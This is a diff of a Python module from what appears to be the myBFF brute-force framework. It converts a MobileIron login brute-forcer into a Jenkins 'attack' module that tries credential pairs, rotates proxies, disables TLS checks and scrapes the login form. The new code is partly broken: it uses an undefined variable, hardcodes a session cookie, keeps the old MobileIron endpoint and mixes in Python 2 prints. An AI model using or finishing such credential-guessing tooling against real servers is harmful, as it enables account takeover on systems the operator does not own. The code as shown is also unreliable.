@@ -1,39 +1,45 @@
 #! /usr/bin/python
-# Created by Kirk Hayes (l0gan) @kirkphayes
-# Part of myBFF
+# this module is for jenkins attacks
 from core.webModule import webModule
 from requests import session
 import requests
 import re
 from argparse import ArgumentParser
+from lxml import html
 import random
 
 
-class MobileIronBrute(webModule):
+class jenkinsBrute(webModule):
     def __init__(self, config, display, lock):
-        super(MobileIronBrute, self).__init__(config, display, lock)
-        self.fingerprint="MobileIron"
+        super(jenkinsBrute, self).__init__(config, display, lock)
+        self.fingerprint="Jenkins"
         self.response="Success"
-    def somethingCool(self, config):
-        print("[-] Not yet implemented...")
+    def somethingCool(self, config, payload):
+        #Do something cool here
+        print("Something Cool not yet implemented")
     def connectTest(self, config, payload):
+        #Create a session and check if account is valid
         with session() as c:
             proxy = random.choice(config["proxies"])
-            requests.packages.urllib3.disable_warnings()
-            resp1 = c.get(config["HOST"] + '/employee/login.jsp', verify=False)#, proxies=proxy)
-            cookie1 = resp1.cookies['JSESSIONID']
-            cookies = dict(JSESSIONID=cookie1)
-            c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': 'http://' + config["HOST"] + '/employee/login.jsp', 'Accept-Language': 'en-US,en;q=0.5'})
-            c.cookies.clear()
-            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)#, proxies=proxy)
+            cookie = {'JSESSIONID.d29cad0c':'14qy4wdxentt311fbwxdw85z7o'}
+            resp1 = c.get(config["HOST"] + '/j_acegi_security_check', cookies=cookie, verify=False, data=payload)#, proxies=proxy)
+            print resp1.headers
+            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)
             m = re.search('You are unauthorized to access this page.', cpost.text)
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                 if not config["dry_run"]:
-                    print("[!] Time to do something cool!")
-                    self.somethingCool(config)
+                   print("[!] Time to do something cool!")
+                   self.somethingCool(config, payload)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
+    def scraper(self, config):
+        # Scrape page to find which parameters are needed
+        with session() as c:
+            resp1 = c.get(config["HOST"] + '/login', verify=False)
+            tree = html.fromstring(resp1.content)
+            username = tree.xpath('//input[@id="j_username"]/text()')
+            print username
     def payload(self, config):
         if config["PASS_FILE"]:
             pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
